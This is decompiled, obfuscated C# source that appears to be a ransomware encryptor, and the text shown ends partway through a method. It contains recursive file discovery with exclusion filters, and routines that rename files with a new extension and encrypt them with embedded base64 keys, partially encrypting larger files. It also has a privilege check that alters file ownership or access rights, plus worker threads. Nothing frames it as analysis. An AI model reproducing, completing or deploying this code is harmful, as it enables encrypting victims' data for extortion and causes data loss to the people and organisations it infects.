using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using XmVNSVPzUwATMS;
using ogUJEKRzCNQ;

namespace nVxbvhuaKzC;

internal sealed class FcnBvlzKWyQDwH
{
	public sealed class IIvhOHDAFoiM
	{
		private static StringCollection EwKTQtMeJvRMV;

		private static List<string> NcqdcwuWbVC;

		[NonSerialized]
		internal static GetString getString_0;

		public static List<string> SearchFiles(string string_0)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(string_0);
		}

		private static List<string> WalkDirectoryTree(string string_0)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(string_0, getString_0(107411832));
			}
			catch
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if ((!text.ToLower().Contains(getString_0(107411827)) && !text.ToLower().Contains(getString_0(107411806)) && !text.ToLower().Contains(getString_0(107388527)) && !text.ToLower().Contains(getString_0(107388482)) && !text.ToLower().Contains(getString_0(107411793)) && !text.ToLower().Contains(getString_0(107388334)) && !text.ToLower().Contains(getString_0(107387722)) && !text.ToLower().Contains(getString_0(107387737)) && !text.ToLower().Contains(getString_0(107387688)) && !text.ToLower().Contains(getString_0(107387703)) && !text.ToLower().Contains(getString_0(107387669)) && !text.ToLower().Contains(getString_0(107387620)) && !text.ToLower().Contains(getString_0(107387635)) && !text.ToLower().Contains(getString_0(107387590)) && !text.ToLower().Contains(getString_0(107387601)) && !text.ToLower().Contains(getString_0(107387556)) && !text.ToLower().Contains(getString_0(107387575)) && !text.ToLower().Contains(getString_0(107387526)) && !text.ToLower().Contains(getString_0(107387541)) && !text.Contains(EvKBdYIakj(getString_0(107388004))) && !text.Contains(getString_0(107387979)) && !text.Contains(getString_0(107387998)) && !text.Contains(getString_0(107387985)) && !text.EndsWith(getString_0(107395670)) && !text.EndsWith(getString_0(107387960)) && !text.EndsWith(getString_0(107387955)) && !text.EndsWith(getString_0(107387918)) && !text.EndsWith(getString_0(107387913)) && !text.ToLower().Contains(getString_0(107387908)) && !text.ToLower().Contains(dkWBHAPryK)) || text.Contains(EvKBdYIakj(getString_0(107388307))))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(bpXPuDgesBNQk) * 1024.0 * 1024.0 && eaVwpFidBvEVE == getString_0(107396971))
							{
								NcqdcwuWbVC.Add(text);
							}
							else if (File.Exists(text) && eaVwpFidBvEVE == getString_0(107396469))
							{
								NcqdcwuWbVC.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(string_0);
				array3 = array2;
				foreach (string string_ in array3)
				{
					WalkDirectoryTree(string_);
				}
			}
			return NcqdcwuWbVC;
		}

		static IIvhOHDAFoiM()
		{
			Strings.CreateGetStringDelegate(typeof(IIvhOHDAFoiM));
			EwKTQtMeJvRMV = new StringCollection();
			NcqdcwuWbVC = new List<string>();
		}
	}

	private sealed class VNHWFfxrkn
	{
		public string uapbUsgPXHabL;

		public bool _003CMain_003Eb__5(Process process_0)
		{
			return process_0.ProcessName == uapbUsgPXHabL;
		}
	}

	private sealed class DnFyLezoexaawD
	{
		public string QPiYaXjxNzol;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CMapDrv_003Eb__19(int int_0)
		{
			Thread.Sleep(MpJOfNTSgoM);
			ErNGCzDqbgJcNq.Add(getString_0(107387873) + QPiYaXjxNzol + getString_0(107396896) + (char)int_0 + getString_0(107411747));
			try
			{
				if (DHKhstFrxWX)
				{
					Console.WriteLine(getString_0(107387873) + QPiYaXjxNzol + getString_0(107396896) + (char)int_0 + getString_0(107411747));
				}
			}
			catch
			{
			}
		}

		static DnFyLezoexaawD()
		{
			Strings.CreateGetStringDelegate(typeof(DnFyLezoexaawD));
		}
	}

	private sealed class fgVvqjTpqhE
	{
		public string EMhfgmNtvaVY;

		public bool _003CIsDriveNTFS_003Eb__1e(DriveInfo driveInfo_0)
		{
			return driveInfo_0.RootDirectory.Name == EMhfgmNtvaVY;
		}
	}

	private sealed class rYqqbsikcTpKOT
	{
		private sealed class yTIQgUdfboGIg
		{
			public rYqqbsikcTpKOT MheqBEirXg;

			public string jvNaQKZkTq;

			public void _003CCrypt_003Eb__29()
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					IUXSYthoJRyA(WindowsIdentity.GetCurrent().Name, jvNaQKZkTq);
				}
			}

			public void _003CCrypt_003Eb__2a()
			{
				rjrkLClQQGAFB(jvNaQKZkTq, MheqBEirXg.wOcAKxBXVrGNs, MheqBEirXg.fBIbvVyOzGKM, MheqBEirXg.kuJVmjuPDryAODW, MheqBEirXg.RchZFkEDjxt);
			}
		}

		public string[] wOcAKxBXVrGNs;

		public string[] kuJVmjuPDryAODW;

		public string RchZFkEDjxt;

		public string fBIbvVyOzGKM;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CCrypt_003Eb__28(string string_0)
		{
			yTIQgUdfboGIg CS_0024_003C_003E8__locals0 = new yTIQgUdfboGIg();
			CS_0024_003C_003E8__locals0.MheqBEirXg = this;
			CS_0024_003C_003E8__locals0.jvNaQKZkTq = string_0;
			if (EjCdzBangCjgRE && !KcMNmzTKVuN().Contains(getString_0(107386292)) && !KcMNmzTKVuN().Contains(getString_0(107411780)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						IUXSYthoJRyA(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.jvNaQKZkTq);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (dWQLbOGxxGUm == getString_0(107396980))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					rjrkLClQQGAFB(CS_0024_003C_003E8__locals0.jvNaQKZkTq, CS_0024_003C_003E8__locals0.MheqBEirXg.wOcAKxBXVrGNs, CS_0024_003C_003E8__locals0.MheqBEirXg.fBIbvVyOzGKM, CS_0024_003C_003E8__locals0.MheqBEirXg.kuJVmjuPDryAODW, CS_0024_003C_003E8__locals0.MheqBEirXg.RchZFkEDjxt);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				rjrkLClQQGAFB(CS_0024_003C_003E8__locals0.jvNaQKZkTq, wOcAKxBXVrGNs, fBIbvVyOzGKM, kuJVmjuPDryAODW, RchZFkEDjxt);
			}
		}

		static rYqqbsikcTpKOT()
		{
			Strings.CreateGetStringDelegate(typeof(rYqqbsikcTpKOT));
		}
	}

	private sealed class TVOFMeqqDEgV
	{
		private sealed class ccrJtSdjBtY
		{
			public TVOFMeqqDEgV LrHzfRIVwfYz;

			public string zmYEiyqFDPcwDa;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__36()
			{
				foreach (string item in WOAZqErHQpvAHsj)
				{
					if (zmYEiyqFDPcwDa.ToLower().EndsWith(item + LrHzfRIVwfYz.DAzuLkugKGvA) && XvBfbWHuciprZZ == getString_0(107396991))
					{
						if (Convert.ToInt32(cfZDnOvovZah) * 1024 * 1024 > new FileInfo(zmYEiyqFDPcwDa).Length)
						{
							try
							{
								hdkhpYUKtylncPr.xRNINHsHor(getString_0(107389874), getString_0(107389869), getString_0(107389312), zmYEiyqFDPcwDa);
							}
							catch
							{
							}
						}
					}
					else if (zmYEiyqFDPcwDa.ToLower().EndsWith(item) && XvBfbWHuciprZZ == getString_0(107396489))
					{
						try
						{
							hdkhpYUKtylncPr.xRNINHsHor(getString_0(107389874), getString_0(107389869), getString_0(107389312), zmYEiyqFDPcwDa);
						}
						catch
						{
						}
					}
				}
			}

			static ccrJtSdjBtY()
			{
				Strings.CreateGetStringDelegate(typeof(ccrJtSdjBtY));
			}
		}

		private sealed class FXSsqhzMboXGq
		{
			public TVOFMeqqDEgV LrHzfRIVwfYz;

			public string IZTAVYfIRdMx;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__38()
			{
				foreach (string item in WOAZqErHQpvAHsj)
				{
					if (IZTAVYfIRdMx.ToLower().EndsWith(item + LrHzfRIVwfYz.DAzuLkugKGvA) && XvBfbWHuciprZZ == getString_0(107396994))
					{
						if (Convert.ToInt32(cfZDnOvovZah) * 1024 * 1024 > new FileInfo(IZTAVYfIRdMx).Length)
						{
							try
							{
								hdkhpYUKtylncPr.xRNINHsHor(getString_0(107389877), getString_0(107389872), getString_0(107389315), IZTAVYfIRdMx);
							}
							catch
							{
							}
						}
					}
					else if (IZTAVYfIRdMx.ToLower().EndsWith(item) && XvBfbWHuciprZZ == getString_0(107396492))
					{
						try
						{
							hdkhpYUKtylncPr.xRNINHsHor(getString_0(107389877), getString_0(107389872), getString_0(107389315), IZTAVYfIRdMx);
						}
						catch
						{
						}
					}
				}
			}

			static FXSsqhzMboXGq()
			{
				Strings.CreateGetStringDelegate(typeof(FXSsqhzMboXGq));
			}
		}

		public List<string> xoIjmFKEIRmgYHRxN;

		public List<string> ZIfnfpwnJXQh;

		public string DAzuLkugKGvA;

		public string[] TtcBirpqXuVooOHN;

		public string ptbrIyAxDBqTL;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CWorkerCrypter2_003Eb__35(string string_0)
		{
			ccrJtSdjBtY CS_0024_003C_003E8__locals0;
			foreach (string item in ZIfnfpwnJXQh)
			{
				if (((item.Contains(getString_0(107388107)) || item.Contains(getString_0(107388050)) || item.Contains(getString_0(107388529)) || item.ToLower().Contains(getString_0(107388544)) || item.ToLower().Contains(getString_0(107388499)) || item.Contains(getString_0(107388474)) || item.Contains(getString_0(107388485)) || item.ToLower().Contains(getString_0(107388440)) || item.ToLower().Contains(getString_0(107388459)) || item.ToLower().Contains(getString_0(107388422)) || item.ToLower().Contains(getString_0(107388381)) || item.ToLower().Contains(getString_0(107388396)) || item.ToLower().Contains(getString_0(107388338)) || item.ToLower().Contains(getString_0(107388317))) && !item.Contains(EvKBdYIakj(getString_0(107388324)))) || item.Contains(getString_0(107387739)) || item.Contains(getString_0(107387754)) || item.Contains(getString_0(107387705)) || item.Contains(getString_0(107387720)) || item.Contains(getString_0(107387671)) || item.Contains(getString_0(107387686)) || item.Contains(getString_0(107387637)) || item.Contains(getString_0(107387652)) || item.Contains(getString_0(107387607)) || item.Contains(getString_0(107387618)) || item.ToLower().Contains(getString_0(107387573)) || item.ToLower().Contains(getString_0(107387592)) || item.ToLower().Contains(getString_0(107387543)) || item.ToLower().Contains(getString_0(107387558)) || item.Contains(EvKBdYIakj(getString_0(107388021))) || item.Contains(getString_0(107387996)) || item.Contains(getString_0(107388015)) || item.Contains(getString_0(107397159)) || item.Contains(getString_0(107388002)) || item.EndsWith(DAzuLkugKGvA) || item.EndsWith(getString_0(107387977)) || item.EndsWith(getString_0(107387972)) || item.EndsWith(getString_0(107387935)) || item.EndsWith(getString_0(107387930)) || item.Contains(getString_0(107387925)) || item.Contains(dkWBHAPryK) || item.Contains(AJzDKHoaGNRf) || item.Contains(THXwmzLnrqe))
				{
					continue;
				}
				if (TtcBirpqXuVooOHN.Length != 0)
				{
					string[] ttcBirpqXuVooOHN = TtcBirpqXuVooOHN;
					int num = 0;
					while (num < ttcBirpqXuVooOHN.Length)
					{
						string value = ttcBirpqXuVooOHN[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_0ea4;
					}
				}
				try
				{
					if (item.EndsWith(DAzuLkugKGvA))
					{
						goto IL_0ea4;
					}
				}
				catch (Exception)
				{
					goto IL_0ea4;
				}
				if (!item.EndsWith(string_0) || mOohEoBvvwIsCph.Contains(item))
				{
					continue;
				}
				if (tFYBgTlzqriJCl == getString_0(107396988))
				{
					try
					{
						if (MXkjmbkMlDW.nnnWjuJHpHvdMj(item))
						{
							MXkjmbkMlDW.APIOoSxtqbbrVSl(item);
						}
					}
					catch
					{
					}
				}
				mOohEoBvvwIsCph.Add(item);
				if (!AVcTEbDnEiIrK.Contains(Path.GetDirectoryName(item)))
				{
					AVcTEbDnEiIrK.Add(Path.GetDirectoryName(item));
				}
				DFfJXunWWjOBFo(item);
				try
				{
					new ZEeNAmcCpQxkDS().EKaaTjlENBUCQI(item);
				}
				catch
				{
				}
				try
				{
					using FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Write);
					if (!fileStream.CanWrite)
					{
						try
						{
							if (DHKhstFrxWX)
							{
								Console.WriteLine(getString_0(107411743) + item + getString_0(107411698) + new FileInfo(item).Length + getString_0(107411677));
								Console.WriteLine(getString_0(107411668));
							}
						}
						catch
						{
						}
						QKkRdHWXNelGs(EvKBdYIakj(getString_0(107412107)), getString_0(107388677) + item + getString_0(107388677) + EvKBdYIakj(getString_0(107412050)) + getString_0(107388677) + Environment.UserName + getString_0(107388677) + EvKBdYIakj(getString_0(107412065)));
					}
				}
				catch (Exception ex2)
				{
					if (IxPlnZLdvsZB)
					{
						try
						{
							File.AppendAllText(AJzDKHoaGNRf, getString_0(107386466) + item + getString_0(107412040) + ex2.Message + getString_0(107396508));
						}
						catch (Exception)
						{
						}
					}
					continue;
				}
				try
				{
					try
					{
						if (new FileInfo(item).Length == 0L)
						{
							continue;
						}
					}
					catch (Exception ex2)
					{
						if (IxPlnZLdvsZB)
						{
							try
							{
								File.AppendAllText(AJzDKHoaGNRf, getString_0(107386466) + item + getString_0(107411927) + ex2.Message + getString_0(107396508));
							}
							catch (Exception)
							{
							}
						}
						YQVkVIVGpFAMQ++;
						goto end_IL_0759;
					}
					byte[] bytes;
					if (QhxiUhpytB == getString_0(107396988) && new FileInfo(item).Length > Convert.ToInt32(KHcVbQthlIOKM) * 1024 * 1024 && !xoIjmFKEIRmgYHRxN.Contains(string_0))
					{
						CS_0024_003C_003E8__locals0 = new ccrJtSdjBtY();
						CS_0024_003C_003E8__locals0.LrHzfRIVwfYz = this;
						try
						{
							if (DAzuLkugKGvA != getString_0(107385707))
							{
								if (ftECRArlHKepq)
								{
									DAzuLkugKGvA = ITyFXeyNngsRQ + DAzuLkugKGvA;
								}
								File.Move(item, item + DAzuLkugKGvA);
							}
						}
						catch (Exception ex2)
						{
							if (IxPlnZLdvsZB)
							{
								try
								{
									File.AppendAllText(AJzDKHoaGNRf, getString_0(107386466) + item + getString_0(107411866) + ex2.Message + getString_0(107396508));
								}
								catch (Exception)
								{
								}
							}
							YQVkVIVGpFAMQ++;
							goto end_IL_0759;
						}
						CS_0024_003C_003E8__locals0.zmYEiyqFDPcwDa = getString_0(107389246);
						if (DAzuLkugKGvA != getString_0(107385707))
						{
							CS_0024_003C_003E8__locals0.zmYEiyqFDPcwDa = item + DAzuLkugKGvA;
						}
						else
						{
							CS_0024_003C_003E8__locals0.zmYEiyqFDPcwDa = item;
						}
						if (oaMCRFYrdbFfau == getString_0(107396988))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item2 in WOAZqErHQpvAHsj)
								{
									if (CS_0024_003C_003E8__locals0.zmYEiyqFDPcwDa.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.LrHzfRIVwfYz.DAzuLkugKGvA) && XvBfbWHuciprZZ == ccrJtSdjBtY.getString_0(107396991))
									{
										if (Convert.ToInt32(cfZDnOvovZah) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.zmYEiyqFDPcwDa).Length)
										{
											try
											{
												hdkhpYUKtylncPr.xRNINHsHor(ccrJtSdjBtY.getString_0(107389874), ccrJtSdjBtY.getString_0(107389869), ccrJtSdjBtY.getString_0(107389312), CS_0024_003C_003E8__locals0.zmYEiyqFDPcwDa);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.zmYEiyqFDPcwDa.ToLower().EndsWith(item2) && XvBfbWHuciprZZ == ccrJtSdjBtY.getString_0(107396489))
									{
										try
										{
											hdkhpYUKtylncPr.xRNINHsHor(ccrJtSdjBtY.getString_0(107389874), ccrJtSdjBtY.getString_0(107389869), ccrJtSdjBtY.getString_0(107389312), CS_0024_003C_003E8__locals0.zmYEiyqFDPcwDa);
										}
										catch
										{
										}
									}
								}
							});
							thread.Priority = ThreadPriority.Normal;
							thread.IsBackground = false;
							thread.Start();
						}
						bytes = Encoding.ASCII.GetBytes(CcZHpsCIoJG);
						if (LhIskusGNtqPC == getString_0(107396486))
						{
							byte[] array = null;
							byte[] byte_ = iQHvEzXEixXur.zQnYkaPtyUjj(CS_0024_003C_003E8__locals0.zmYEiyqFDPcwDa, Convert.ToInt32(KHcVbQthlIOKM) * 1024 * 1024);
							if (iQHvEzXEixXur.yPLRgFIAPWTIT(hggTPAfoWyJLMW: (!oVxIyLzScyQqp) ? (YrjqOIvQHnLHl ? iQHvEzXEixXur.fYNdrMmszbFBKK(byte_, Convert.FromBase64String(ptbrIyAxDBqTL), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : iQHvEzXEixXur.fYNdrMmszbFBKK(byte_, Convert.FromBase64String(ptbrIyAxDBqTL), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (YrjqOIvQHnLHl ? qHHSaqSanlGZcJ.vHaUZnXLDnsvO(byte_, Convert.FromBase64String(ptbrIyAxDBqTL), Convert.FromBase64String(MxPnNSnkNuk)) : qHHSaqSanlGZcJ.vHaUZnXLDnsvO(byte_, Convert.FromBase64String(ptbrIyAxDBqTL), Convert.FromBase64String(MxPnNSnkNuk))), rGiQcJBSsDU: CS_0024_003C_003E8__locals0.zmYEiyqFDPcwDa, LoTahZDxSK: bytes))
							{
								goto IL_0ea4;
							}
							try
							{
								File.Move(item + DAzuLkugKGvA, item);
							}
							catch (Exception)
							{
							}
						}
						else if (!YrjqOIvQHnLHl)
						{
							if (IQGXzrSFQTv.lVXyHETerTvlQUP(CS_0024_003C_003E8__locals0.zmYEiyqFDPcwDa, KHcVbQthlIOKM, ptbrIyAxDBqTL, null, Convert.FromBase64String(MxPnNSnkNuk)))
							{
								goto IL_0ea4;
							}
							try
							{
								File.Move(item + DAzuLkugKGvA, item);
							}
							catch (Exception)
							{
							}
						}
						else
						{
							if (IQGXzrSFQTv.lVXyHETerTvlQUP(CS_0024_003C_003E8__locals0.zmYEiyqFDPcwDa, KHcVbQthlIOKM, ptbrIyAxDBqTL, bytes, Convert.FromBase64String(MxPnNSnkNuk)))
							{
								goto IL_0ea4;
							}
							try
							{
								File.Move(item + DAzuLkugKGvA, item);
							}
							catch (Exception)
							{
							}
						}
						continue;
					}
					if (ftECRArlHKepq)
					{
						DAzuLkugKGvA = ITyFXeyNngsRQ + DAzuLkugKGvA;
					}
					bytes = Encoding.ASCII.GetBytes(CcZHpsCIoJG);
					if (DAzuLkugKGvA != getString_0(107385707))
					{
						if (!aYdUAapWGSeW)
						{
							if (!YrjqOIvQHnLHl)
							{
								VzUXnxrRrdNjo(item, item + DAzuLkugKGvA, NLiEmQZDarX);
							}
							else
							{
								VzUXnxrRrdNjo(item, item + DAzuLkugKGvA, Convert.FromBase64String(ptbrIyAxDBqTL));
							}
						}
						else
						{
							try
							{
								if (!YrjqOIvQHnLHl)
								{
									KaQFQiQUZOvLzjc(item, item + DAzuLkugKGvA, NLiEmQZDarX, Convert.FromBase64String(MxPnNSnkNuk));
								}
								else
								{
									KaQFQiQUZOvLzjc(item, item + DAzuLkugKGvA, Convert.FromBase64String(ptbrIyAxDBqTL), Convert.FromBase64String(MxPnNSnkNuk));
								}
							}
							catch (Exception ex2)
							{
								if (IxPlnZLdvsZB)
								{
									try
									{
										File.AppendAllText(AJzDKHoaGNRf, getString_0(107386466) + item + getString_0(107385661) + ex2.Message + getString_0(107396508));
									}
									catch (Exception)
									{
									}
								}
								YQVkVIVGpFAMQ++;
								try
								{
									File.Move(item + DAzuLkugKGvA, item);
								}
								catch (Exception)
								{
								}
								goto end_IL_0759;
							}
						}
					}
					else if (!aYdUAapWGSeW)
					{
						if (!YrjqOIvQHnLHl)
						{
							VzUXnxrRrdNjo(item, item + getString_0(107385702), NLiEmQZDarX);
						}
						else
						{
							VzUXnxrRrdNjo(item, item + getString_0(107385702), Convert.FromBase64String(ptbrIyAxDBqTL));
						}
					}
					else
					{
						try
						{
							if (!YrjqOIvQHnLHl)
							{
								KaQFQiQUZOvLzjc(item, item, NLiEmQZDarX, Convert.FromBase64String(MxPnNSnkNuk));
							}
							else
							{
								KaQFQiQUZOvLzjc(item, item, Convert.FromBase64String(ptbrIyAxDBqTL), Convert.FromBase64String(MxPnNSnkNuk));
							}
						}
						catch (Exception ex2)
						{
							if (IxPlnZLdvsZB)
							{
								try
								{
									File.AppendAllText(AJzDKHoaGNRf, getString_0(107386466) + item + getString_0(107385661) + ex2.Message + getString_0(107396508));
								}
								catch (Exception)
								{
								}
							}
							YQVkVIVGpFAMQ++;
							goto end_IL_0759;
						}
					}
					if (YrjqOIvQHnLHl)
					{
						if (DAzuLkugKGvA != getString_0(107385707))
						{
							cPkfysCcaOIXirBU(item + DAzuLkugKGvA, bytes);
						}
						else
						{
							cPkfysCcaOIXirBU(item, bytes);
						}
					}
					goto IL_0ea4;
					end_IL_0759:;
				}
				catch (Exception)
				{
					goto IL_0ea4;
				}
				continue;
				IL_0ea4:
				ZIfnfpwnJXQh.Remove(item);
			}
		}

		public void _003CWorkerCrypter2_003Eb__37(string string_0)
		{
			FXSsqhzMboXGq CS_0024_003C_003E8__locals0 = new FXSsqhzMboXGq();
			CS_0024_003C_003E8__locals0.LrHzfRIVwfYz = this;
			CS_0024_003C_003E8__locals0.IZTAVYfIRdMx = string_0;
			if (((!CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.Contains(getString_0(107388107)) && !CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.Contains(getString_0(107388050)) && !CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.Contains(getString_0(107388529)) && !CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.ToLower().Contains(getString_0(107388544)) && !CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.ToLower().Contains(getString_0(107388499)) && !CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.Contains(getString_0(107388474)) && !CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.Contains(getString_0(107388485)) && !CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.ToLower().Contains(getString_0(107388440)) && !CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.ToLower().Contains(getString_0(107388459)) && !CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.ToLower().Contains(getString_0(107388422)) && !CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.ToLower().Contains(getString_0(107388381)) && !CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.ToLower().Contains(getString_0(107388396)) && !CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.ToLower().Contains(getString_0(107388338)) && !CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.ToLower().Contains(getString_0(107388317))) || CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.Contains(EvKBdYIakj(getString_0(107388324)))) && !CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.Contains(getString_0(107387739)) && !CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.Contains(getString_0(107387754)) && !CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.Contains(getString_0(107387705)) && !CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.Contains(getString_0(107387720)) && !CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.Contains(getString_0(107387671)) && !CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.Contains(getString_0(107387686)) && !CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.Contains(getString_0(107387637)) && !CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.Contains(getString_0(107387652)) && !CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.Contains(getString_0(107387607)) && !CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.Contains(getString_0(107387618)) && !CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.ToLower().Contains(getString_0(107387573)) && !CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.ToLower().Contains(getString_0(107387592)) && !CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.ToLower().Contains(getString_0(107387543)) && !CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.ToLower().Contains(getString_0(107387558)) && !CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.Contains(EvKBdYIakj(getString_0(107388021))) && !CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.Contains(getString_0(107387996)) && !CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.Contains(getString_0(107388015)) && !CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.Contains(getString_0(107397159)) && !CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.Contains(getString_0(107388002)) && !CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.EndsWith(DAzuLkugKGvA) && !CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.EndsWith(getString_0(107387977)) && !CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.EndsWith(getString_0(107387972)) && !CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.EndsWith(getString_0(107387935)) && !CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.EndsWith(getString_0(107387930)) && !CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.Contains(getString_0(107387925)) && !CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.Contains(dkWBHAPryK) && !CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.Contains(AJzDKHoaGNRf) && !CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.Contains(THXwmzLnrqe))
			{
				if (TtcBirpqXuVooOHN.Length != 0)
				{
					string[] ttcBirpqXuVooOHN = TtcBirpqXuVooOHN;
					int num = 0;
					while (num < ttcBirpqXuVooOHN.Length)
					{
						string value = ttcBirpqXuVooOHN[num];
						if (!CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_102b;
					}
				}
				try
				{
					if (CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.EndsWith(DAzuLkugKGvA))
					{
						goto IL_102b;
					}
				}
				catch (Exception)
				{
					goto IL_102b;
				}
				if (!mOohEoBvvwIsCph.Contains(CS_0024_003C_003E8__locals0.IZTAVYfIRdMx))
				{
					if (tFYBgTlzqriJCl == getString_0(107396988))
					{
						try
						{
							if (MXkjmbkMlDW.nnnWjuJHpHvdMj(CS_0024_003C_003E8__locals0.IZTAVYfIRdMx))
							{
								MXkjmbkMlDW.APIOoSxtqbbrVSl(CS_0024_003C_003E8__locals0.IZTAVYfIRdMx);
							}
						}
						catch
						{
						}
					}
					mOohEoBvvwIsCph.Add(CS_0024_003C_003E8__locals0.IZTAVYfIRdMx);
					if (!AVcTEbDnEiIrK.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.IZTAVYfIRdMx)))
					{
						AVcTEbDnEiIrK.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.IZTAVYfIRdMx));
					}
					DFfJXunWWjOBFo(CS_0024_003C_003E8__locals0.IZTAVYfIRdMx);
					try
					{
						new ZEeNAmcCpQxkDS().EKaaTjlENBUCQI(CS_0024_003C_003E8__locals0.IZTAVYfIRdMx);
					}
					catch
					{
					}
					try
					{
						using FileStream fileStream = new FileStream(CS_0024_003C_003E8__locals0.IZTAVYfIRdMx, FileMode.Open, FileAccess.Write);
						if (!fileStream.CanWrite)
						{
							try
							{
								if (DHKhstFrxWX)
								{
									Console.WriteLine(getString_0(107411743) + CS_0024_003C_003E8__locals0.IZTAVYfIRdMx + getString_0(107411698) + new FileInfo(CS_0024_003C_003E8__locals0.IZTAVYfIRdMx).Length + getString_0(107411677));
									Console.WriteLine(getString_0(107411668));
								}
							}
							catch
							{
							}
							QKkRdHWXNelGs(EvKBdYIakj(getString_0(107412107)), getString_0(107388677) + CS_0024_003C_003E8__locals0.IZTAVYfIRdMx + getString_0(107388677) + EvKBdYIakj(getString_0(107412050)) + getString_0(107388677) + Environment.UserName + getString_0(107388677) + EvKBdYIakj(getString_0(107412065)));
						}
					}
					catch (Exception ex2)
					{
						if (IxPlnZLdvsZB)
						{
							try
							{
								File.AppendAllText(AJzDKHoaGNRf, getString_0(107386466) + CS_0024_003C_003E8__locals0.IZTAVYfIRdMx + getString_0(107412040) + ex2.Message + getString_0(107396508));
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
						return;
					}
					try
					{
						try
						{
							if (new FileInfo(CS_0024_003C_003E8__locals0.IZTAVYfIRdMx).Length != 0L)
							{
								goto end_IL_0875;
							}
							goto end_IL_0874;
							end_IL_0875:;
						}
						catch (Exception ex2)
						{
							if (IxPlnZLdvsZB)
							{
								try
								{
									File.AppendAllText(AJzDKHoaGNRf, getString_0(107386466) + CS_0024_003C_003E8__locals0.IZTAVYfIRdMx + getString_0(107411927) + ex2.Message + getString_0(107396508));
								}
								catch (Exception)
								{
								}
							}
							YQVkVIVGpFAMQ++;
							goto end_IL_0874;
						}
